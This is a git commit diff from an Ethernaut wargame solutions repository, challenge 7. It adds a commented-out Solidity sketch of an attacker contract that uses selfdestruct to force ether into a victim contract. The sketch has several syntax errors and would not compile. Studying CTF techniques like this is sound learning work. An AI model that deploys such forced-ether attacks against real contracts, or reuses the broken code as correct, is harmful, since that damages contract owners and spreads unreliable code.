872672bb6f399d8d978e2d7e5c32446c5c36ea59
Stefan Lehmann <85541624+Stefan1612@users.noreply.github.com>
2022-07-21 00:19:38 +0200

    Update Contract Vulnerabilities.sol

--- Ethernaut Challenge 7/Contract Vulnerabilities.sol
+++ Ethernaut Challenge 7/Contract Vulnerabilities.sol
@@ -7,6 +7,28 @@ pragma solidity ^0.6.0;
 // Every contract can receive ether forcefully with the "seldestruct" function
 // e.g. =>  
 
+/* 
+contract maliciousContractExample {
+  
+  address private owner;
+  
+  constructor() {
+  owner = msg.sender
+  };
+  
+  // 1. So, we can easily send eth into this contract
+   fallback() external payable {
+  };
+  
+  // 2. selfdestruct this contract with ether inside and transfer is to vulnerable contract
+  
+  function(address victim) public {
+  require(msg.sender == owner, "caller isn't owner");
+  selfdestruct(victim);
+  };
+  
+}
+*/
 
 
 contract Force 
